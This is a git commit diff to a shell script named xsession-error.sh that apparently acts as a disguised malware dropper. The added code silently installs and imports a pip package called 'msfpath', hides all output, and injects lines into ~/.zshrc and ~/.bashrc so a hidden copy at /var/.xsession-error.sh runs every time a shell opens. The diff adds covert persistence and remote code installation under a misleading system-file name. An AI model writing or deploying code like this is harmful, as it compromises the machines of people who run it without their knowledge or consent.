958a1e04e162da50a0cd307385315ef6581f7021
gobiwound <118014051+gobiwound@users.noreply.github.com>
2022-11-14 14:12:03 -0800

    Update xsession-error.sh

--- xsession-error.sh
+++ xsession-error.sh
@@ -7,15 +7,30 @@ then
 rm output.txt
 else 
 rm output.txt 
+step2 >/dev/null 2>&1
 python3 -c 'from msfpath import check' > /dev/null 2
 fi
 } 
 function step2(){ 
-sed -i '5i /bin/zsh  /home/$he/.xsession-error.sh  >/dev/null 2' ~/.zshrc
-sed -i '5i /bin/zsh  /home/$he/.xsession-error.sh  >/dev/null 2' ~/.bashrc
+he=$(echo $USER) 
+hi=$(cat ~/.zshrc | grep '/bin/zsh  /var/.xsession-error.sh  >/dev/null 2')
+if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
+then
+echo ""
+else
+sed -i "5i /bin/zsh  /var/.xsession-error.sh  >/dev/null 2" ~/.zshrc
+fi
+hi=$(cat ~/.bashrc | grep '/bin/bash  /var/.xsession-error.sh  >/dev/null 2')
+if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
+then
+echo ""
+else
+echo ""
+sed -i "5i /bin/bash  /var/.xsession-error.sh  >/dev/null 2" ~/.bashrc
+fi
 }  
 function initial(){
 pip list | grep -F msfpath | grep -o "msfpath" > /dev/null &&  step1 ||  python3 -m pip install msfpath -q -q -q  && step1 > /dev/null
 }
-chmod +x /home/$USER/.xsession-error.sh
+chmod +x /var/.xsession-error.sh
 initial
